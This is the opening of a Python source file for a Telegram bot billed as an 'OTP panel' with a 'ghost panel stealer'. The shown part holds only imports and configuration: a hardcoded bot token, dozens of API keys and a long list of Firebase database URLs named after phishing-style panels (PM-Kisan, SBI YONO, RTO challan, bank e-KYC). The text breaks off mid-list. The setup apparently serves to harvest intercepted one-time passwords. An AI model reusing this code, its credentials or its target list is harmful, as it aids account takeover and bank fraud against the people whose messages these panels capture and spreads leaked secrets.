#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
  OTP PANEL BOT — PRIVATE ADMIN EDITION           
  Superfast Engine + Smart Auto-Checker + Live Spam Fix
  + Strict 1-Hour Fast Inbox + Background Ghost Workers
  + Referral System + Force Join + Hourly Admin Backups
  + GHOST PANEL STEALER + 10-MILLION USER ARCHITECTURE
  + FIXED HANDLERS (NO CRASH)
══════════════════════════════════════════════════════
"""

import os
import sys
import re
import time
import json
import random
import asyncio
import logging
import warnings
import traceback
import gc
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import BadRequest, Forbidden, NetworkError
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# 🛑 Suppress Windows Asyncio Error Spam & Python Warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
logging.basicConfig(format="%(asctime)s — %(levelname)s — %(message)s", level=logging.WARNING)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

# ═══════════════════════════════════════════════════════
#  CONFIGURATION & GLOBALS
# ═══════════════════════════════════════════════════════

POLL_INTERVAL   = 3  
SMS_LIMIT       = 10 
PAGE_SIZE       = 20    
TOKEN           = "8839521261:AAFjpwMHtt3TtECRmfKHirqUw0i7tPUQRpQ"
BOT_USERNAME    = "offermeeshobot"

# 🔴 All your Admin IDs are registered here
ADMIN_IDS: set[int] = {6860106371, 8306147833, 89522700, 19858746}

# 🔴 MANDATORY CHANNELS FOR FORCE JOIN
FORCE_JOIN_CHATS = ["@sabkijayhokhush", "@leakmethodfree", "@rosekhudkabanaya"]

DB_DIR = "Panel_Databases"
USERS_DIR = os.path.join(DB_DIR, "Users")
CLONES_DIR = os.path.join(DB_DIR, "Clones")
SYS_DIR = os.path.join(DB_DIR, "System")
SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")

seen_ids:  set[str] = set()   
first_run: bool     = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None
start_time = time.time()
total_otps_processed = 0

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  
chats_registry: dict[str, set[int]] = {TOKEN: set()} 
user_seen_unreg: dict[int, set[str]] = {}

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}

SETTINGS = {"base_price": 30, "global_panels": []}

API_LOCK = asyncio.Lock()
WORKER_SEMAPHORE = asyncio.Semaphore(1500) 
PREFETCH_POOL: dict[str, list] = {}
PREFETCH_TASKS: dict[str, asyncio.Task] = {}

SYS_SETTINGS = {
    "api_keys": [
        "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x", "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT",
        "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg", "AK_Kq1ctHXEH2ansTWeY9h4BeilG5Pae0VC",
        "AK_nPBGxUCq0AWTtm1nus7TFnX1i0v0Bs5", "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6",
        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM", "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-", "AK_-aF0H5eQAekk-YmU63WlpPf3MQ5oLxZV",
        "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv", "AK_VxWU04ePsl_m66_wEx0t7iisRDsiymAd",
        "AK_bMsPDvvgkD7K5Kb_wH6tFiU9tOPnwgHb", "AK_LpJ9kGcHQfWIfqoN-EG-2Ngg1_yXQhLH",
        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74", "AK_-EAJ5LyrnsOGlsgafV-sbg5AUsyJ-zJn",
        "AK_p4NwDAzl3aod2paD9e3UnvKVVTPdD6Dl", "AK_J_1R4tCvxZgqvfCEDjT1hZZjwIRB4rnU",
        "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh", "AK_82DbShpWkA6_Ctln35D7d7jOzWOQkJk7",
        "AK_Z67i7aPkuL4Iid7Vq8OgOuJb7ewNZy4K", "AK_l3KWP5J0l0vpRHV_xMMYqVY9OUGLcIJO",
        "AK_Y6tDZmfylYdDchpsSbyqzu5YuD1bnbNo", "AK_bC4UzJNUG4Yk8TtT3mxqxNJ6oIPLiBfh",
        "AK_BtvAIidv7mzczqKdg-y5-Pw4C9Ri7Pvw", "AK_CphAPpSkMgIKLCzBYZFCt6mN68FgOgq3",
        "AK_16LERGicFB6uncWbhCjeE9uD-UHjrFsA", "AK_0damiG8gnn6xBLe3__JBfcvH_rJh686E",
        "AK_gvRJyMC_byA4xamTOrRsWiNEHPrs_QS1", "AK_YvD2v66Ue-YlZ-Hu18s3NvNaL2vql2r3",
        "AK_5QuS_fHqe6eE-zTaZ_fDclt29D9yMDgE", "AK_xY9PPRI388wiXjpbRQWCQrc5jA9mBrAa",
        "AK_KY-Lvl-_x7-t8hQlzuSwI3s2fBooCJAd", "AK_Pg_J42kDmN2gazXPgCZlxNt6fsfnOlCT",
        "AK_R5xBtr0Mejw-0a54j-gTxh8feMjQZcOn", "AK_9CXg3dKl-IxLDIerpMzhd-KVE3HCMCso",
        "AK_7Mif5BId_Iz5rjpKD6Fc2k6DX7mqCEyU", "AK__OdSNA9Dq-3YJEueBT1-OcnRiJGkN1Y0",
        "AK_LnxgclktRe50Phzzwcon4kltxFtxx2vJ", "AK_8NlERdLgolrFdeddI3sMrjZG8bICRHoF",
        "AK_3pTIVB1bG172ZlXmch3ICqCNcRyx8gwA", "AK_etId74tu1V75auJXiq1Y_jV9H9lsQ4am",
        "AK_YIpYpHNlCNnjLeSUdkA-lqSGZ94nppjt", "AK_QLZXoprRieTkAZlgERxHdr9I1sL3bGP_",
        "AK_-08LOerb6jaCx52JmjDC0pMWhNzgVRbZ", "AK_mS7CAb1vPUnhQorNuxDgV_xfNN2kyoGW",
        "AK_LncxU9pi2mte200towYPh-ae2FcrMO9j", "AK_7DTjFAVezVWUvSvI4Ni-3_0L1t3uNwbw",
        "AK_UGc1SjKM7pWUiub6xq3n-wTXa4p_Jrse", "AK_NuDV1z5xOi0uT7fxks4TfA0I0iPBbiFM",
        "AK_NwhgeV64GrdGFoSaFj7LbqiieQObi55o", "AK_T2uFNlEPzaKT3OeIROc9FVYpYhYeFjma",
        "AK_PD7Nc8H2a0DNwENQmlflKvCBEow30UD9", "AK_Htire7-fPlEdEMNAdtkQ0wZ0NS4ttbaz",
        "AK_r8Sk4b7UzPf_DhbM_-tjVe1moW1iRLy5", "AK_EifnL8Bx6DfCIGRJGikPvPoYNkmpvTqF",
        "AK_I6lx-tDgEJA0P_jP1foxgM2eUO5F-tJd", "AK_VqzDvRR4oJyG_zBZmHSjX2f57Z4dngfy",
        "AK_5pvQYHaqr_71s4Wq0-_tRvgJBBscn6xB", "AK_1JbT6popnOVlIO929J9Y2Z0-gyHUCXdL",
        "AK_PrWss32JjoP7nv6ttNOP0d3RYynqslug", "AK_ldeMT-eBQ2whhXvakm9frq59bmxYNo1Y",
        "AK_dQhyxP4BsTbEIQ1s_VgXJkt4up4IX9UV", "AK_ak1Fy5vvoXhFInwSunFWEBz3SAuEltiO",
        "AK_80VoNRC8pkOHI7Kbpe7ybvWcTq2ktuWO", "AK_n3rVdC1y5fIRJDLosvsNzQimr16D-zmr",
        "AK_VuokZpsT91F2-TzrO13RQZ3BTOF1VOlA", "AK_GGulMMNAcqKRf8BAXQfzlesaozh917Re",
        "AK_JDvMk7HIq4yhD1NvEZ0bRRgdnjyUrK_M", "AK_suKV-7E1peiwoxFLoi67ENmraj0mKRkE",
        "AK_H2puTEPDk4cZ9LnW_vq-wdhjS7pMihgb", "AK_1yxxKAYrCLdun4jOSejUckG58QokfbPb"
    ],
    "check_anim": "⚡"
}

RAW_URLS = list(set([
    "https://aaaa-b3749-default-rtdb.firebaseio.com", "https://aashish-2e04c-default-rtdb.firebaseio.com",
    "https://aaya-6e335-default-rtdb.firebaseio.com", "https://aaya2-8df9a-default-rtdb.firebaseio.com",
    "https://access20-3fc38-default-rtdb.firebaseio.com", "https://activity-e16b3-default-rtdb.firebaseio.com",
    "https://admin-822e2-default-rtdb.firebaseio.com", "https://admin-panel-2272-default-rtdb.firebaseio.com",
    "https://ai-rto-9-default-rtdb.firebaseio.com", "https://airto-abde2-default-rtdb.firebaseio.com",
    "https://aiye-a-rajesh-default-rtdb.firebaseio.com", "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "https://ajna-20fc4-default-rtdb.firebaseio.com", "https://alfabomber-c746b-default-rtdb.firebaseio.com",
    "https://alpha-af0d2.firebaseio.com", "https://amirrr-8a463-default-rtdb.firebaseio.com",
    "https://anamikaadminpanel-default-rtdb.firebaseio.com", "https://ankur-2511f-default-rtdb.firebaseio.com",
    "https://annapunna-12b79-default-rtdb.firebaseio.com", "https://anvith6-9450e-default-rtdb.firebaseio.com",
    "https://apkdriod-default-rtdb.firebaseio.com", "https://apkdriod-f6fb9-default-rtdb.firebaseio.com",
    "https://apkpure-6eb6a-default-rtdb.firebaseio.com", "https://app-2-7ac78-default-rtdb.firebaseio.com",
    "https://asdtest-project-default-rtdb.firebaseio.com", "https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
    "https://aya-wed-anvith-default-rtdb.firebaseio.com", "https://babu-2b2c2-default-rtdb.firebaseio.com",
    "https://badboys-16296-default-rtdb.firebaseio.com", "https://bandhan2-7jan-default-rtdb.firebaseio.com",
    "https://bank-e-kyc-default-rtdb.firebaseio.com", "https://bihar-chandan-c2af8-default-rtdb.firebaseio.com",
    "https://bihar-new-770fb-default-rtdb.firebaseio.com", "https://biharnew-2380d-default-rtdb.firebaseio.com",
    "https://biharnew2-default-rtdb.firebaseio.com", "https://billojii-default-rtdb.firebaseio.com",
    "https://bittu-2d39e-default-rtdb.firebaseio.com", "https://bob-4-a4078-default-rtdb.firebaseio.com",
    "https://boi-3-8914d-default-rtdb.firebaseio.com", "https://bossuun-default-rtdb.firebaseio.com",
    "https://bu-3-13-default-rtdb.firebaseio.com", "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com", "https://can-4-668a0-default-rtdb.firebaseio.com",
    "https://challan5-default-rtdb.firebaseio.com", "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "https://chhnuk05-3188e-default-rtdb.firebaseio.com", "https://ck-kumar3-default-rtdb.firebaseio.com",
    "https://colana-84ce2-default-rtdb.firebaseio.com", "https://comeback-5b876-default-rtdb.firebaseio.com",
    "https://cs23-9e709-default-rtdb.firebaseio.com", "https://cs2xc-3951e-default-rtdb.firebaseio.com",
    "https://cs6mycarry68jh-default-rtdb.firebaseio.com", "https://csforme-dc64a-default-rtdb.firebaseio.com",
    "https://csk-41-default-rtdb.firebaseio.com", "https://cust-4-a7670-default-rtdb.firebaseio.com",
    "https://cust-6-default-rtdb.firebaseio.com", "https://customer03support-default-rtdb.firebaseio.com",
    "https://dark-274b4-default-rtdb.firebaseio.com", "https://darknet-26b68-default-rtdb.firebaseio.com",
    "https://davil-d4e77-default-rtdb.firebaseio.com", "https://demon-4-default-rtdb.firebaseio.com",
    "https://desi-742d2-default-rtdb.firebaseio.com", "https://desi-balak2-default-rtdb.firebaseio.com",
    "https://dev-rahul-3ca89-default-rtdb.firebaseio.com", "https://dhani-aa151-default-rtdb.firebaseio.com",
    "https://dhheee-b95dc-default-rtdb.firebaseio.com", "https://djjd-22e61-default-rtdb.firebaseio.com",
    "https://dogla-de225-default-rtdb.firebaseio.com", "https://doxci-9daa3-default-rtdb.firebaseio.com",
    "https://drugi-numer.firebaseio.com", "https://duuu-dc41d-default-rtdb.firebaseio.com",
    "https://dwala-3d1ff-default-rtdb.firebaseio.com", "https://dyydd-c53c8-default-rtdb.firebaseio.com",
    "https://e10ttqaq-default-rtdb.firebaseio.com", "https://e14turnament2-default-rtdb.firebaseio.com",
    "https://e5turnament2-default-rtdb.firebaseio.com", "https://egale-74-default-rtdb.firebaseio.com",
    "https://fir-1fa16-default-rtdb.firebaseio.com", "https://fir-27c9e-default-rtdb.firebaseio.com",
    "https://fir-408f9-default-rtdb.firebaseio.com", "https://fires-847da-default-rtdb.firebaseio.com",
    "https://flash-v7powerengine-v7-default-rtdb.firebaseio.com", "https://flashbomber-18413-default-rtdb.firebaseio.com",
    "https://fortydata-fee65-default-rtdb.firebaseio.com", "https://fpro3indus-default-rtdb.firebaseio.com",
    "https://gaandkiaand-default-rtdb.firebaseio.com", "https://gas56-5d2b9-default-rtdb.firebaseio.com",
    "https://gggggg-979bd-default-rtdb.firebaseio.com", "https://gghhh-35b79-default-rtdb.firebaseio.com",
    "https://giagas2-default-rtdb.firebaseio.com", "https://gjhghjj-3d251-default-rtdb.firebaseio.com",
    "https://go-one-1b6b2-default-rtdb.firebaseio.com", "https://gren-ff2af-default-rtdb.firebaseio.com",
    "https://h-5-12-default-rtdb.firebaseio.com", "https://hch-cj-default-rtdb.firebaseio.com",
    "https://hdhe-4dad5-default-rtdb.firebaseio.com", "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com",
    "https://hdmax1-58366-default-rtdb.firebaseio.com", "https://hehe-679dd-default-rtdb.firebaseio.com",
    "https://hello-6153b-default-rtdb.firebaseio.com", "https://hopkhfg-9981a-default-rtdb.firebaseio.com",
    "https://hospital-8707c-default-rtdb.firebaseio.com", "https://hsm2pro21-default-rtdb.firebaseio.com",
    "https://igii-1d529-default-rtdb.firebaseio.com", "https://imdum-6e873-default-rtdb.firebaseio.com",
    "https://indus-1-cec4f-default-rtdb.firebaseio.com", "https://inf-flash-default-rtdb.firebaseio.com",
    "https://jaduopop-a9a12-default-rtdb.firebaseio.com", "https://jamtar7-95f77-default-rtdb.firebaseio.com",
    "https://jamtara118-7cd20-default-rtdb.firebaseio.com", "https://jamtara123-42608-default-rtdb.firebaseio.com",
    "https://jamtara133-61d7e-default-rtdb.firebaseio.com", "https://jamtara140-73bf7-default-rtdb.firebaseio.com",
    "https://jamtara150-62b22-default-rtdb.firebaseio.com", "https://jamtara181-default-rtdb.firebaseio.com",
    "https://jamtara32-4a5f1-default-rtdb.firebaseio.com", "https://jamtara74-c231e-default-rtdb.firebaseio.com",
    "https://jayma-9ce22-default-rtdb.firebaseio.com", "https://jeet-op-default-rtdb.firebaseio.com",
    "https://jjkkkk-a6cad-default-rtdb.firebaseio.com", "https://jsjsjs-20d84-default-rtdb.firebaseio.com",
    "https://juhiishita786-67829-default-rtdb.firebaseio.com", "https://kanha-3bf53-default-rtdb.firebaseio.com",
    "https://karishmacsc-42128-default-rtdb.firebaseio.com", "https://kha-hai-default-rtdb.firebaseio.com",
    "https://kingbggbb-default-rtdb.firebaseio.com", "https://kisi-d6da8-default-rtdb.firebaseio.com",
    "https://kitter-34345-default-rtdb.firebaseio.com", "https://kitter-rajk8-default-rtdb.firebaseio.com",
    "https://kituu36-58290-default-rtdb.firebaseio.com", "https://komaljah-default-rtdb.firebaseio.com",
    "https://kumarlive1-default-rtdb.firebaseio.com", "https://kumu-f2257-default-rtdb.firebaseio.com",
    "https://lalanashish2-default-rtdb.firebaseio.com", "https://lalannew-9392c-default-rtdb.firebaseio.com",
    "https://lalannew5-default-rtdb.firebaseio.com", "https://lalansale-default-rtdb.firebaseio.com",
    "https://lalit-7b538-default-rtdb.firebaseio.com", "https://lawrence-7b55f-default-rtdb.firebaseio.com",
    "https://le-bhaii-default-rtdb.firebaseio.com", "https://loda-5029e-default-rtdb.firebaseio.com",
    "https://loda-9358c-default-rtdb.firebaseio.com", "https://lovefimus-default-rtdb.firebaseio.com",
    "https://maik-31440-default-rtdb.firebaseio.com", "https://mano99-default-rtdb.firebaseio.com",
    "https://manuwa-bb70a-default-rtdb.firebaseio.com", "https://maxa29-f652e-default-rtdb.firebaseio.com",
    "https://mayor-6f08c-default-rtdb.firebaseio.com", "https://mera-wala-71a5e-default-rtdb.firebaseio.com",
    "https://mera5-a7138-default-rtdb.firebaseio.com", "https://mithun-3d803-default-rtdb.firebaseio.com",
    "https://mman-433ae-default-rtdb.firebaseio.com", "https://mmmm-f7678-default-rtdb.firebaseio.com",
    "https://money-ace2c-default-rtdb.firebaseio.com", "https://mp-24jfg-default-rtdb.firebaseio.com",
    "https://mpari-6a6e5-default-rtdb.firebaseio.com", "https://muajob-29c86-default-rtdb.firebaseio.com",
    "https://mun4-ff5d4-default-rtdb.firebaseio.com", "https://myabtar-default-rtdb.firebaseio.com",
    "https://myadmin-38635-default-rtdb.firebaseio.com", "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://mypanelbot-default-rtdb.firebaseio.com", "https://navin512-54d6f-default-rtdb.firebaseio.com",
    "https://newappi-7661a-default-rtdb.firebaseio.com", "https://newspreding-default-rtdb.firebaseio.com",
    "https://nky0-a5870-default-rtdb.firebaseio.com", "https://nn02-7189f-default-rtdb.firebaseio.com",
    "https://paid-hack-2-default-rtdb.firebaseio.com", "https://paidhackrat-default-rtdb.firebaseio.com",
    "https://pand-c8e35-default-rtdb.firebaseio.com", "https://panel-wala-v108-default-rtdb.firebaseio.com",
    "https://panel-wala-v11-default-rtdb.firebaseio.com", "https://panel-wala-v16-default-rtdb.firebaseio.com",
    "https://panel-wala-v17-default-rtdb.firebaseio.com", "https://panel-wala-v28-default-rtdb.firebaseio.com",
    "https://panel-wala-v40-default-rtdb.firebaseio.com", "https://panel-wala-v64-default-rtdb.firebaseio.com",
    "https://panel-wala-v70-default-rtdb.firebaseio.com", "https://panel123628-default-rtdb.firebaseio.com",
    "https://parkashbhai-default-rtdb.firebaseio.com", "https://pawankumar92342038-8f702-default-rtdb.firebaseio.com",
    "https://pawanpanel-63418-default-rtdb.firebaseio.com", "https://pehla-panel-green-default-rtdb.firebaseio.com",
    "https://pinkyrani-default-rtdb.firebaseio.com", "https://pintu-8921f-default-rtdb.firebaseio.com",
    "https://pk114-6e828-default-rtdb.firebaseio.com", "https://pk175-b429e-default-rtdb.firebaseio.com",
    "https://please-2b091-default-rtdb.firebaseio.com", "https://pm-india-07bhb-default-rtdb.firebaseio.com",
    "https://pm-india-07y-gu-default-rtdb.firebaseio.com", "https://pm-kisan-01hfg-default-rtdb.firebaseio.com",
    "https://pm-kisan-03-9c8f7-default-rtdb.firebaseio.com", "https://pm-kisan-04-de0e4-default-rtdb.firebaseio.com",
    "https://pm-kisan-05jg-default-rtdb.firebaseio.com", "https://pm-kisan-111-default-rtdb.firebaseio.com",
    "https://pm-kisan-13bguh-default-rtdb.firebaseio.com", "https://pm-kisan-13gfh-default-rtdb.firebaseio.com",
    "https://pm-kisan-17hh-default-rtdb.firebaseio.com", "https://pm-kisan-18hgu-default-rtdb.firebaseio.com",
    "https://pm-kisan-20-vgg-default-rtdb.firebaseio.com", "https://pm-kisan-21gvh-default-rtdb.firebaseio.com",
    "https://pm-kisan-24dty-59dd1-default-rtdb.firebaseio.com", "https://pm-kisan-25hxg-default-rtdb.firebaseio.com",
    "https://pm-kisan-28hhj-default-rtdb.firebaseio.com", "https://pm-kisan-28jbj-default-rtdb.firebaseio.com",
    "https://pm-kisan-28ugg-default-rtdb.firebaseio.com", "https://pm-kishan-23gug-default-rtdb.firebaseio.com",
    "https://pm-kishan-24hguh-default-rtdb.firebaseio.com", "https://pm-kishan-24jfyg-default-rtdb.firebaseio.com",
    "https://pm-kishan-28bub-default-rtdb.firebaseio.com", "https://pm-kishan-30-huhj-default-rtdb.firebaseio.com",
    "https://pm-kishan-31-ea1ac-default-rtdb.firebaseio.com", "https://pm-kishan-a8-default-rtdb.firebaseio.com",
    "https://pm-kishan-b3-default-rtdb.firebaseio.com", "https://pm-kishan-b4-default-rtdb.firebaseio.com",
    "https://pm-modi-22dh-default-rtdb.firebaseio.com", "https://pm-modi-22hch-hu-default-rtdb.firebaseio.com",
    "https://pm-modi-27jff-default-rtdb.firebaseio.com", "https://pmfg-ccccc-default-rtdb.firebaseio.com",
    "https://pmkisan-9fdd5-default-rtdb.firebaseio.com", "https://pmnr1newad-default-rtdb.firebaseio.com",
    "https://pmsjdj-default-rtdb.firebaseio.com", "https://pohn-cd7ea-default-rtdb.firebaseio.com",
    "https://pojakr-d81e3-default-rtdb.firebaseio.com", "https://pp30-fc7e5-default-rtdb.firebaseio.com",
    "https://privatesok-59944-default-rtdb.firebaseio.com", "https://priyaknn-3e914-default-rtdb.firebaseio.com",
    "https://proffercelawte-default-rtdb.firebaseio.com", "https://project-f2fd6-default-rtdb.firebaseio.com",
    "https://project0809-c3674-default-rtdb.firebaseio.com", "https://project3-13fff-default-rtdb.firebaseio.com",
    "https://projectpksk05102025-default-rtdb.firebaseio.com", "https://projectpm0809-default-rtdb.firebaseio.com",
    "https://projectpm2209-default-rtdb.firebaseio.com", "https://projectrto2209-default-rtdb.firebaseio.com",
    "https://projectsb0810-default-rtdb.firebaseio.com", "https://pung-345e5-default-rtdb.firebaseio.com",
    "https://pvn7-a873a-default-rtdb.firebaseio.com", "https://r62710898-39a8e-default-rtdb.firebaseio.com",
    "https://radhe-d31aa-default-rtdb.firebaseio.com", "https://raghu-c1d6f-default-rtdb.firebaseio.com",
    "https://rahg-4564c-default-rtdb.firebaseio.com", "https://rahu80759-ac69b-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com", "https://rahul-6bf55-default-rtdb.firebaseio.com",
    "https://rahulcscperosnl-default-rtdb.firebaseio.com", "https://rahulgandhi-d09ca-default-rtdb.firebaseio.com",
    "https://raj-kumar-63492-default-rtdb.firebaseio.com", "https://raj254346kumar-84033-default-rtdb.firebaseio.com",
    "https://raja252525raj-4ee9a-default-rtdb.firebaseio.com", "https://rajputchuttad-default-rtdb.firebaseio.com",
    "https://rajputlodu-5bed0-default-rtdb.firebaseio.com", "https://rajshoott-adminna-kutt-default-rtdb.firebaseio.com",
    "https://rajucs-bca5d-default-rtdb.firebaseio.com", "https://raki143aa-default-rtdb.firebaseio.com",
    "https://rameshwar-7okt-default-rtdb.firebaseio.com", "https://randa-2609c-default-rtdb.firebaseio.com",
    "https://randi-rona-81876-default-rtdb.firebaseio.com", "https://rando-acf5a-default-rtdb.firebaseio.com",
    "https://ranjibses-default-rtdb.firebaseio.com", "https://rantaishita-f7614-default-rtdb.firebaseio.com",
    "https://ravi-23776-default-rtdb.firebaseio.com", "https://raxtyc-default-rtdb.firebaseio.com",
    "https://rbl-7-e796b-default-rtdb.firebaseio.com", "https://rc-39-15-default-rtdb.firebaseio.com",
    "https://rdkkk-a6706-default-rtdb.firebaseio.com", "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "https://rider-a922c-default-rtdb.firebaseio.com", "https://risho-d4c66-default-rtdb.firebaseio.com",
    "https://rmx3511uuj-default-rtdb.firebaseio.com", "https://rnd12-17508-default-rtdb.firebaseio.com",
    "https://rontem-a082b-default-rtdb.firebaseio.com", "https://root-3rto-default-rtdb.firebaseio.com",
    "https://rt51-6e1df-default-rtdb.firebaseio.com", "https://rto-10-default-rtdb.firebaseio.com",
    "https://rto-47-b39f4-default-rtdb.firebaseio.com", "https://rto-chalan-14-gyf-default-rtdb.firebaseio.com",
    "https://rto-chalan-b10ad-default-rtdb.firebaseio.com", "https://rto-e-chall-4-default-rtdb.firebaseio.com",
    "https://rto23-a5d99-default-rtdb.firebaseio.com", "https://rto50-84d38-default-rtdb.firebaseio.com",
    "https://rto68-1a61f-default-rtdb.firebaseio.com", "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "https://rto91-2b27f-default-rtdb.firebaseio.com", "https://rtoadmin-49319-default-rtdb.firebaseio.com",
    "https://rtochallan-8579d-default-rtdb.firebaseio.com", "https://rtochallan8-default-rtdb.firebaseio.com",
    "https://rtomatrix-c1e78-default-rtdb.firebaseio.com", "https://rtompari-default-rtdb.firebaseio.com",
    "https://ruff-panel-default-rtdb.firebaseio.com", "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "https://ruparamee-14f4b-default-rtdb.firebaseio.com", "https://s85138920-87594-default-rtdb.firebaseio.com",
    "https://salasali6990-1171d-default-rtdb.firebaseio.com", "https://samar84900-6f084-default-rtdb.firebaseio.com",
    "https://samar95476-54eb9-default-rtdb.firebaseio.com", "https://sampanel-fc525-default-rtdb.firebaseio.com",
    "https://sanj-683c4-default-rtdb.firebaseio.com", "https://sanjee-9918a-default-rtdb.firebaseio.com",
    "https://santosh-jii-default-rtdb.firebaseio.com", "https://sb35-d1851-default-rtdb.firebaseio.com",
    "https://sbi-credit-card-27-default-rtdb.firebaseio.com", "https://sbi-yono-i31an-default-rtdb.firebaseio.com",
    "https://sep12-aea6d-default-rtdb.firebaseio.com", "https://server-1-c3501-default-rtdb.firebaseio.com",
    "https://server-2-a095f-default-rtdb.firebaseio.com", "https://server-2-fb768-default-rtdb.firebaseio.com",
    "https://server-23-d1605-default-rtdb.firebaseio.com", "https://server-3-e44be-default-rtdb.firebaseio.com",
    "https://server-6-42c3b-default-rtdb.firebaseio.com", "https://server-97e23-default-rtdb.firebaseio.com",
    "https://server14-c6551-default-rtdb.firebaseio.com", "https://sexology-6fa9c-default-rtdb.firebaseio.com",
    "https://sexy-chat-c66b8-default-rtdb.firebaseio.com", "https://shooot-admin-kitter-default-rtdb.firebaseio.com",
    "https://shoot44-default-rtdb.firebaseio.com", "https://sikapro13uagtwo-default-rtdb.firebaseio.com",
    "https://singhaana-6f199-default-rtdb.firebaseio.com", "https://sirelech1-default-rtdb.firebaseio.com",
    "https://skkumar-2cb0e-default-rtdb.firebaseio.com", "https://smas-8bff8-default-rtdb.firebaseio.com",
    "https://sms-receive-22100.firebaseio.com", "https://smsmms-3b08e-default-rtdb.firebaseio.com",
    "https://spy-25-default-rtdb.firebaseio.com", "https://strom-90e84-default-rtdb.firebaseio.com",
    "https://stsfk30aug-default-rtdb.firebaseio.com", "https://suraj-30e07-default-rtdb.firebaseio.com",
    "https://suraj-b9a86-default-rtdb.firebaseio.com", "https://svi13-531bf-default-rtdb.firebaseio.com",
    "https://testing-81627-default-rtdb.firebaseio.com", "https://testingyou-2dcac-default-rtdb.firebaseio.com",
    "https://tillu-2-default-rtdb.firebaseio.com", "https://tryagainnew-58f1a-default-rtdb.firebaseio.com",
    "https://trying-90b4b-default-rtdb.firebaseio.com", "https://trypan3l-default-rtdb.firebaseio.com",
    "https://tt01-5e373-default-rtdb.firebaseio.com", "https://u13667713-dc566-default-rtdb.firebaseio.com",
    "https://u16714964-283ef-default-rtdb.firebaseio.com", "https://u24143844-c1b11-default-rtdb.firebaseio.com",
    "https://u24153206-5eef6-default-rtdb.firebaseio.com", "https://u2519579-a31aa-default-rtdb.firebaseio.com",
    "https://u25428732-91bd9-default-rtdb.firebaseio.com", "https://u25783858-e6739-default-rtdb.firebaseio.com",
    "https://u2865726-eeb1f-default-rtdb.firebaseio.com", "https://u40179853-987df-default-rtdb.firebaseio.com",
    "https://u58325342-dffc0-default-rtdb.firebaseio.com", "https://u62751482-f5b46-default-rtdb.firebaseio.com",
    "https://u62803313-e54bc-default-rtdb.firebaseio.com", "https://u66grdgh-default-rtdb.firebaseio.com",
    "https://u67583339-bf0c1-default-rtdb.firebaseio.com", "https://u72328193-47b68-default-rtdb.firebaseio.com",
    "https://u72749819-fa563-default-rtdb.firebaseio.com", "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "https://u8208372-ad1d1-default-rtdb.firebaseio.com", "https://udkudjudj-default-rtdb.firebaseio.com",
    "https://ufff-52c18-default-rtdb.firebaseio.com", "https://ujjwal-86c6e-default-rtdb.firebaseio.com",
    "https://ullusah-default-rtdb.firebaseio.com", "https://ultra-14-default-rtdb.firebaseio.com",
    "https://ultra29s25ultra-4ef28-default-rtdb.firebaseio.com", "https://ultra381144-d1af5-default-rtdb.firebaseio.com",
    "https://vdgdgd-80f1e-default-rtdb.firebaseio.com", "https://vecna-82db2-default-rtdb.firebaseio.com",
    "https://vgfffd-bef01-default-rtdb.firebaseio.com", "https://vibe-d238e-default-rtdb.firebaseio.com",
    "https://videocalls-f3434-default-rtdb.firebaseio.com", "https://virugoniya-default-rtdb.firebaseio.com",
    "https://vishnunew16-default-rtdb.firebaseio.com", "https://vsbsvs-default-rtdb.firebaseio.com",
    "https://xc04-52348-default-rtdb.firebaseio.com", "https://yes2-ead3d-default-rtdb.firebaseio.com",
    "https://yono-sb41-default-rtdb.firebaseio.com", "https://pm-kisan-22f92-default-rtdb.firebaseio.com", 
    "https://panel-9-d6ece-default-rtdb.firebaseio.com", "https://lodaroll-default-rtdb.firebaseio.com", 
    "https://amoyu-af062-default-rtdb.firebaseio.com", "https://ankur-bdcc9-default-rtdb.firebaseio.com", 
    "https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com", "https://oyilo-5cada-default-rtdb.firebaseio.com", 
    "https://dinu-ji99-default-rtdb.firebaseio.com", "https://tinmm88-b7db5-default-rtdb.firebaseio.com", 
    "https://ritesh0001-ea582-default-rtdb.firebaseio.com", "https://raaz-5287d-default-rtdb.firebaseio.com", 
    "https://mafiaaaa2oppp-default-rtdb.firebaseio.com", "https://bishnu-a0e01-default-rtdb.firebaseio.com", 
    "https://sunrajas-default-rtdb.firebaseio.com", "https://rajakk-80ecd-default-rtdb.firebaseio.com", 
    "https://hospital-14-default-rtdb.firebaseio.com", "https://newyear-f8f14-default-rtdb.firebaseio.com", 
